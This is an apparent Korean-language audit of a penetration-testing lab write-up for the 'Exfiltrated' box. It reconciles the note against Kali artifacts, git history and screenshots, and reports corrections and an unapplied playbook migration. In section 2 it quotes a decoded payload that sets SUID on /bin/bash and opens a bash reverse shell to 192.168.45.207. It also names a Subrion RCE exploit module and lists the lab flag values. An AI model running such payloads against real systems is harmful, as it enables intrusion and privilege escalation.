---
type: audit
target: "[[Exfiltrated]]"
wave: 13
date: 2026-08-26
manual_tags: true
manual_cves: true
---

# Exfiltrated 감사 (wave 13)

대상: `03. PG\Exfiltrated.md` (개작 초고 357행 → 감사 후 386행)
baseline: git HEAD `076525b` 판 825행 · `03. PG\_backup\Exfiltrated.md.bak2`(동일본)

---

## 0. 결론 요약

- **날조 없음.** 지목 1번(출처 없는 타겟 pty 프롬프트)은 **git HEAD 원문에 전부 동일 위치·동일 내용으로 존재** — 레거시 상속이고 작성자 창작이 아님. 등급 `근거부족`, 보존 + 유보 표기 확대로 처리
- **Kali 산출물과 노트가 어긋나는 곳 2건 발견·정정**(nmap raw 문자열 손실, `configfile` 원문 개변)
- **인과 오류 1건 정정** — 웹셸 스크린샷을 근거로 한 `[가정]` 강등의 논리가 뒤집혀 있었음
- **최대 문제는 노트가 아니라 이관** — `_PLAYBOOK.md` 에 Exfiltrated 이관분이 **한 건도 반영되지 않았음**(§4)

---

## 1. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu (Ubuntu ...` | **raw 개변.** `nmap.log` 원문은 `OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)` — 패치 리비전 `4ubuntu0.2` 가 지워져 있었음 | 원문 복원 + `Not shown: 65533 closed tcp ports (reset)`·`http-title`·`http-server-header`·`http-robots.txt` 라인 복원(전부 `nmap.log` 실측) |
| `0xc51b => { Name => 'HasselbladExif', Writable => 'string', WriteGroup => 'IFD0' },` | **raw 개변.** 「출처: `exif/configfile`」캡션을 달고 있으면서 실제 파일의 6줄 구조를 1줄로 접어 놓음(레거시 상속분) | 실물 바이트 그대로 복원 + md5 `924e0f9baf5e4b5e65c36820cbacb710` 병기. `0xc51b`·`1; #end` 역할 해설을 산문으로 되살림(`.bak2` §2-7 표에서 소실됐던 것) |
| `스크린샷 ... 에는 id 결과만 담겨 있음 — uname -a 는 별도 요청에서 확인한 것일 수 있어 [가정]` | **인과 오류.** 스크린샷은 `?cmd=id` **단독 요청**의 헤드리스 캡처라 `id;uname -a` 블록의 잘린 판본이 아님. 「스크린샷에 없다」를 반증처럼 읽은 것이 오류 | 「부재는 반증이 아니라 다른 요청이라는 뜻」으로 정정. 실제 근거부족 사유(`id;uname -a` 요청의 raw 로그가 산출물에 없음)를 따로 명시하고 `[가정]` 유지 |
| `/uploads/.htaccess  403  283  ← 디스크에 실존` (```text 펜스) | 펜스 안에 한국어 주석(`←`)이 섞여 **실측 캡처 표식을 위조**. 실제 프로브 raw 로그도 산출물에 없음 | 표로 전환(펜스 밖) + 「프로브 raw 로그 없음, 값은 노트 원 기록」 명시. 283바이트 기준선은 `gobuster_files.txt` 루트 `/.htaccess (Status: 403) [Size: 283]` 로 **독립 확인**됨을 병기 |
| `[try 6]  -rwxr-xr-x ... ← 약 48초, 아직` (```text 펜스) | 동일 — 폴링 스크립트 마커 + 한국어 주석이 든 재구성물이 실측 펜스로 표시됨 | 표로 전환. 폴링 8초 근거(`.bak2` §4-5 에서 소실)를 산문으로 복원 |
| `/cron/ — 인증 없이 웹에서 크론 트리거 가능` | **미검증 단정.** 산출물에 있는 것은 `gobuster_dirs.txt` 의 `/cron/ (Status: 200) [Size: 43]` 뿐. 「트리거 가능」은 트리거를 실제로 해본 기록이 없음 | 관측치(200/43바이트)만 단정하고 트리거 여부는 `[가정]` 으로 강등. `/hybrid/` 도 473바이트 실측치 병기 |
| `80 이 ... 로 302 리다이렉트함` | **상태 코드 미검증.** `nmap.log` 는 `Did not follow redirect to ...` 라고만 적고 302 를 명시하지 않음 | 「리다이렉트함(nmap 이 따라가지 않고 `http-title` 로 남김)」으로 정정 |
| `Metasploit 에 이 취약점 모듈이 있으나(... 계열)` | 모듈명이 「계열」로 흐려져 있었음 | Kali 실측으로 확정(`/usr/share/metasploit-framework/modules/exploits/multi/http/subrion_cms_file_upload_rce.rb`) → 헤지 제거하고 정확한 경로 명시 |
| `⚠️ 이 두 플래그의 raw 캡처를 담은 별도 파일이 없음 — 근거는 위 pty 세션 캡처 블록뿐` | **유보 범위가 좁음.** 플래그만 언급했으나 실제로는 크론 스크립트·`/etc/crontab`·`exiftool -ver`·root 셸 접속·정리 블록 **전부**가 같은 출처 상태. 「위」 상대 참조도 있었음 | 유보를 pty 블록 전체로 확대, 「셸 안 명령은 `~/.zsh_history` 에 안 남음」이라는 구조적 사유 명시, 상대 참조 제거. 동시에 **양성 증거**(Kali 산출물은 전량 보존, `image.jpg` md5 일치)를 병기해 과잉 의심도 차단 |
| (신규) 업로드 화면 근거 없음 | `~/PG/Exfiltrated/screenshots/pg_exf_panel_uploads.png` 가 볼트로 이관되지 않아 미사용 상태였음 | `파일보관\PG-Exfiltrated-panel_uploads.png` 로 복사·임베드. elFinder UI + `Unable to connect to backend. HTTP error 0`(헤드리스에서 커넥터 호출 실패) → 「UI 를 몰지 않고 커넥터를 직접 때린」 판단의 실측 근거가 됨 |
| 대시보드 스크린샷 캡션 | 화면에 실제로 찍힌 내용을 안 옮기고 있었음 | 직접 열어 확인한 문자열로 캡션 보강 — `Subrion CMS v 4.2.1`(사이드바 좌하단), `1896 days ago — Subrion version 4.2.1 installed. Cheers!`, `Administrator logged in from 192.168.45.207. — you.` |
| `POST /panel/uploads/read.json` 요약 블록 | `sub_upload.py` 가 실제로 보내는 `mtime[]` 필드 누락 | `mtime[]=1621210391` 복원 + 「요청 조립은 `sub_upload.py`」 출처 캡션 추가 |
| `gobuster.txt`(0바이트) 미언급 | 0바이트 파일이 노트 어디에도 안 나옴 — 「빈 파일」로 버려질 위험 | 와일드카드 중단 메시지 원문(`the server returns a status code that matches the provided options for non existing urls => 301`, `.bak2` 보존분)을 복원하고, **0바이트가 그 중단의 기록**임을 명시 |
| `## 관련` | 개작에서 참고자료 3건이 소실 | `Apache PHP 핸들러 매핑`(경로 포함), `PayloadsAllTheThings — Upload Insecure Files`, `[[01. Pentest Foundations]]` 복원 |

## 삭제한 것

**없음.** 이번 감사에서 노트 본문을 지운 곳은 없음. 펜스 → 표 전환 2건은 값·구조를 그대로 옮긴 것이고, 개변된 raw 2건은 원본 방향으로 되돌린 것임.

---

## 2. 반증한 것 — 지적으로 올랐다가 확인 결과 노트가 옳았던 것

1. **「출처 없는 pty 프롬프트 = 창작」 — 반증됨.** 지목 1번이 가장 강한 의심이었으나, `git show HEAD:"03. PG/Exfiltrated.md"` 로 개작 직전 825행 판을 꺼내 보니 `www-data@exfiltrated:/$`(458·480·483행), `root@exfiltrated:~#`(576·579·805~807행) 블록이 **전부 동일 내용으로 이미 존재**했음. `.bak2` 와도 행 단위 일치. 작성자는 **보존했을 뿐 만들지 않았음.** 부재를 근거로 지웠다면 실측 파괴 4번째 사고가 됐을 것

2. **「웹셸 스크린샷이 `uname -a` 를 반박한다」 — 반증됨.** `PG-Exfiltrated-webshell.png` 를 직접 열어 보니 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 한 줄만 있는 6.8KB 이미지 — 이는 `?cmd=id` 단독 요청의 헤드리스 캡처이지 `id;uname -a` 요청의 캡처가 아님. **스크린샷은 노트를 반박하지 않음.** 강등 자체는 다른 사유(raw 로그 부재)로 유지했으나 **근거가 틀렸으므로 서술을 갈아엎음**

3. **「Kali 프롬프트 전량 제거」 — 정당함(반증 실패).** 직접 재확인: `grep -ac exfil ~/.zsh_history` → **0**, `grep -al 'kali㉿kali' -r ~/PG/Exfiltrated/` → **히트 없음**. `tmux capture-pane` 산출물도 없음. 즉 PwnLab 형 예외에 해당하지 않고, `.bak2` 의 `┌──(kali㉿kali)` 블록 7곳은 비대화형 `ssh kali "..."` 실행에 붙인 창작이 맞음. 작성자 판단 유지

4. **`admin:admin` 로그인 · Subrion 4.2.1 — 스크린샷으로 양성 확인.** 대시보드 이미지에 `Administrator logged in from 192.168.45.207. — you.`(Kali tun0) 와 `Subrion version 4.2.1 installed. Cheers!` 가 함께 찍혀 있어 두 주장이 **동시에** 증명됨. 부재 추론이 필요 없는 사례

5. **페이로드 체인 전량 — 산출물로 양성 확인.** `exif/payload` 바이트 일치, base64 디코드 결과가 노트의 `chmod +s /bin/bash; (bash -c 'bash -i >& /dev/tcp/192.168.45.207/5555 0>&1' &)` 와 정확히 일치, `exploit.djvu` 헤더가 `AT&TFORM…DJVU INFO…BGjp…ANTz` 로 `djvumake` 인자와 일치, `image.jpg` md5 `5f817e389ada908a21433ad20403a884` 가 노트 두 곳(제작 시·타겟 배치 후)의 값과 일치, `image.jpg_original`(Exif 없는 64x64) 존재가 `exiftool` in-place 기록을 뒷받침

6. **Apache `FilesMatch` 일반 지식 — 실행으로 확인.** Kali `/etc/apache2/mods-available/php8.4.conf` 에 `<FilesMatch ".+\.ph(?:ar|p|tml)$">` 실재. 비캡처군 표기 차이만 있고 매핑 집합(`.phar`·`.php`·`.phtml`)은 동일. `.php3`~`.php7`·`.pht` 비매칭이라는 노트 서술도 정규식상 정확

7. **`_PLAYBOOK` 앵커 4개 — 실재 확인.** `A-14`(154행) · `B-31`(2748행) · `B-81`(3318행) · `B-82`(3344행) 모두 존재해 노트의 `[[_PLAYBOOK#…]]` 링크가 깨지지 않음

---

## 3. 확인했으나 손대지 않은 것

- **`ports: [22, 80]`** — `nmap.log` 와 일치, 오탐 없음. `manual_ports` 불필요
- **`manual_tags: true` / `tech_count: 4`** — `default-creds`·`file-upload`·`cron`·`revshell` 넷 다 실제 사용됨. 설명만 하고 안 쓴 기법 태그 없음
- **`cves:`** — `CVE-2018-19422`·`CVE-2021-22204` 둘 다 실제 악용. 반증·비교 목적으로만 언급된 CVE 가 본문에 없으므로 `manual_cves` 선언 불필요
- **골격** — `> [!info] 요약`(절 번호 나열 없음, 「시행착오·교훈 → [[_PLAYBOOK]]」 한 줄 존재) / `## Target #1 – 192.168.248.163` / 긴 제목 `### Initial Access`(4항목만) / `### Service Enumeration`(Port Scan Results 표 + nmap raw + 버전 근거 2개) / 짧은 제목 `### Initial Access`(첫 절과 문구 다름) + `**Local.txt value:**` / `### Privilege Escalation`(4항목) / `### Post-Exploitation` + `**Proof.txt value:**` + 남긴 흔적 / `## 관련` — 전부 충족
- **4항목 완비** — 두 finding 모두 `Vulnerability Explanation:`·`Vulnerability Fix:`·`Severity:`·`Steps to reproduce the attack:` 넷 다 존재. `Steps` 는 번호 목록이고 순서만 담음. 4항목 안에 「아래」·「위」 상대 참조 없음
- **nmap raw 색인 라인** — `22/tcp open  ssh …`·`80/tcp open  http …` 가 펜스 안에 살아 있어 `extract.py` `PORT_RE` 가 긁을 수 있음
- **플래그 값 한 글자 대조** — `local.txt` `46fac3d0bd247ed4b44a22187386b65f` / `proof.txt` `36609d5b634dd0b79041f3ad480fbdd2`. 현 노트 3곳(본문 블록·`Local.txt value`·표) ↔ `.bak2` 580·581·604·605행 ↔ git HEAD 동일 행 **전부 일치**. 스크린샷 전사 경로가 아니므로 오독 위험 없음
- **코드펜스 태깅** — 24쌍 전부 `text`/`bash`/`json` 태그. 무태그 펜스 0
- **문체** — 개조식 준수. `pg-doc-reviewer` 로 넘길 건 없음(**문체 이관 0건**)

---

## 4. 총괄 판단이 필요한 것 — 이관이 «제안 상태»로 멈춰 있음

**`03. PG\_PLAYBOOK.md` 에 Exfiltrated 이관분이 한 건도 반영되지 않았음.**

```
grep -c 'Exfiltrated' _PLAYBOOK.md  →  2
```

그 2건은 **개작 이전부터 있던 이름 언급뿐**임(2752행 크론 누적 패턴, 3331행 base64 누적 패턴). 즉 노트에서 **468행이 나갔는데 `_PLAYBOOK` 이 받은 것은 0행**임.

- 제안 7건은 `03. PG\_AUDIT\Exfiltrated-playbook.md` 에 ④지우기 전 원문 인용과 함께 살아 있으므로 **영구 손실은 아니고 미처리 상태**임. 되살릴 수 있음
- `_PLAYBOOK.md` 수정은 감사자 권한 밖이라 손대지 않았음(총괄·관리자 몫)

**이관 제안서 자체의 결손 3건** (제안서를 반영할 때 함께 메울 것):

| 소실 내용 | 원 위치 | 상태 |
|---|---|---|
| 업로드 검증 **4계층 우회 표**(클라이언트/블랙리스트/화이트리스트/콘텐츠검사) | `.bak2` §2-1 | 제안 7 ③에 **미흡수**. ④ 인용에도 없음 → `.bak2`·git 에서만 복구 가능 |
| `-G`/`--data-urlencode` 표 + **URL 길이 제한 대응**(Apache `LimitRequestLine` 8190, `split`+`>>`, `python3 -m http.server` 순 대체) | `.bak2` §4-4 | 제안 5 ③에 **미흡수**. 노트에는 한 줄로만 축약돼 대체 경로가 통째로 사라짐 |
| 제안 3(B-31)의 ④ 원문 인용이 **포인터뿐**(「`.bak2` 참조」) | `_AUDIT\Exfiltrated-playbook.md` 90행 | 다른 제안과 달리 전문 인용이 없음. `.bak2`·git 이 있어 복구는 가능하나 제안서 단독으로는 자족적이지 않음 |

**색인**: 프론트매터 변경 없음(태그·CVE·ports 모두 그대로). 다만 본문 행수·임베드가 바뀌었으므로 다음 웨이브 마감 시 `refresh.ps1` 대상에 포함할 것 — 감사자가 직접 돌리지 않았음.

**`_STATUS.md`**: 건드리지 않음. 판정은 **완료 2/2**(local + proof), 근거는 위 「플래그 값 한 글자 대조」 항목.

---

## 5. 근거 출처

- **git**: `git show HEAD:"03. PG/Exfiltrated.md"`(825행, 개작 직전) — pty 프롬프트 레거시 확정의 결정적 근거
- **백업**: `03. PG\_backup\Exfiltrated.md.bak2`(git HEAD 와 동일본)
- **Kali 산출물**: `~/PG/Exfiltrated/` — `nmap.log` · `gobuster_dirs.txt` · `gobuster_files.txt` · `gobuster.txt`(0바이트) · `49876.py` · `sub_upload.py` · `exif/{configfile,payload,payload.bzz,exploit.djvu,image.jpg,image.jpg_original}` · `screenshots/*`
- **스크린샷 직접 열람**: `파일보관\PG-Exfiltrated-webshell.png` · `PG-Exfiltrated-panel_dashboard.png` · `PG-Exfiltrated-panel_uploads.png`(이번에 이관)
- **Kali 직접 실행**:
  - `grep -ac exfil ~/.zsh_history` → `0`
  - `grep -al 'kali㉿kali' -r ~/PG/Exfiltrated/` → 히트 없음
  - `grep -n 'FilesMatch' /etc/apache2/mods-available/php8.4.conf` → `".+\.ph(?:ar|p|tml)$"`
  - `find /usr/share/metasploit-framework/modules -iname '*subrion*'` → `exploits/multi/http/subrion_cms_file_upload_rce.rb`
  - `md5sum ~/PG/Exfiltrated/exif/*` → `image.jpg` = `5f817e389ada908a21433ad20403a884`
  - `echo '<base64>' | base64 -d` → 노트의 디코드 결과와 일치
  - `xxd exif/exploit.djvu | head` → `AT&TFORM…DJVU INFO…BGjp…ANTz`
  - `file exif/image.jpg exif/image.jpg_original` → Exif 유/무 대조
- **`49876.py` 소스 직접 확인**: 92행 `up_cookies = {"INTELLI_06c8042c3d": "15ajqmku31n5e893djc8k8g7a0", "loader": "loaded"}` → 95행 `session.post(url, cookies=up_cookies, ...)`, 109행 `cmd = input('$ ')` — 노트의 EDB 49876 서술이 소스와 정확히 일치함을 확인
- **`_PLAYBOOK.md`**: `grep -c 'Exfiltrated'` → 2(둘 다 개작 이전 언급), 앵커 `A-14`·`B-31`·`B-81`·`B-82` 실재 확인
